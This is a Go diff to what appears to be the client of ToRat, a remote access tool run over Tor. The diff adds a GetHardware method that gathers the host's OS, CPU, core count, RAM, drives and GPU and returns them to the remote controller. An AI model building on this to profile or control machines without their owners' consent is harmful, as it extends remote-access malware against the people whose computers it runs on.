@@ -8,7 +8,9 @@ import (
 	"os"
 	"path/filepath"
 	"reflect"
+	"runtime"
 
+	"github.com/jaypipes/ghw"
 	"github.com/lu4p/ToRat/shared"
 	"github.com/lu4p/ToRat/torat_client/crypto"
 	"github.com/lu4p/cat"
@@ -156,4 +158,28 @@ func (a *API) Cd(path string, r *shared.Dir) (err error) {
 	r.Path = cwd
 	r.Files, err = filepath.Glob("*")
 	return err
+}
+
+// Hardware Survey Section
+func (a *API) GetHardware(v shared.Void, r *shared.Hardware) error {
+	// We don't care about errors (they won't panic)
+	cpu, _ := ghw.CPU()
+	memory, _ := ghw.Memory()
+	block, _ := ghw.Block()
+	gpu, _ := ghw.GPU()
+
+	r.OS = runtime.GOOS
+	r.Cores = cpu.TotalThreads
+	r.RAM = memory.String()
+	r.Drives = block.String()
+
+	for _, proc := range cpu.Processors {
+		r.CPU = proc.Model
+	}
+
+	for _, vc := range gpu.GraphicsCards {
+		r.GPU = vc.DeviceInfo.Product.Name
+	}
+
+	return nil
 }
